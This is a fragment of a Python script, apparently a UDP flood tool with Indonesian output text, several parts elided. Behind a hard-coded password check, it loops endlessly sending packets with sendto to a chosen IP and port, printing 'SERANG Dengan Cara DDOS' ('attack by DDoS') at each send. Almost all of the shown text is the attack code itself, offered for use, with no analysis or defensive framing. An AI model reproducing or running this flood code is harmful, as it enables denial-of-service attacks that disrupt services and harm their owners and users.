...
time.sleep(2)
os.system("clear")
if password == "mega" and nama == "Athur":
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
				print(i +" \033[96mSERANG Dengan Cara DDOS Untuk Athur Escobong = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
		except:
				print("\033[95m[!] \033[96mSERANG Dengan Cara DDOS Untuk Athur Escobong = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
...
def udp2():
				...
				while True:
					try:
						...
						for x in range(times):
							s.sendto(data,addr)
							print(i +"\033[96m SERANG Dengan Cara DDOS Untuk Athur Escobong = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
					except:
						print("\033[95m[!]\033[96m SERANG Dengan Cara DDOS Untuk Athur Escobong = \033[91m%s \033[96mPort = \033[91m%s \033[96m!!!"%(ip,port))
